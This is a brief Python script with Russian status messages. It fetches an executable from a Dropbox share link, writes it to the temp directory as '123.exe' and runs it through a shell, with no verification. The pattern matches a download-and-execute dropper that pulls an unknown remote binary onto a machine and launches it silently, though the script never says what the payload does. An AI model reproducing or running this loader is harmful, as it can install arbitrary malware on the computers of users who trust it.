import os
import tempfile
import requests
import subprocess

URL = "https://www.dropbox.com/scl/fi/9guh7pdcap45paceyvu9q/updater.exe?rlkey=3zukihnlct2qsz7c3ds05isd0&st=ra8iyhmt&dl=1"
FILENAME = os.path.join(tempfile.gettempdir(), "123.exe")

def download_and_run():
    if not os.path.exists(FILENAME):
        r = requests.get(URL)
        if r.status_code == 200:
            with open(FILENAME, "wb") as f:
                f.write(r.content)
            print(f"Файл скачан в {FILENAME}")
        else:
            print(f"Ошибка скачивания: {r.status_code}")
    else:
        print(f"Файл уже существует: {FILENAME}")

    if os.path.exists(FILENAME):
        subprocess.Popen([FILENAME], shell=True)
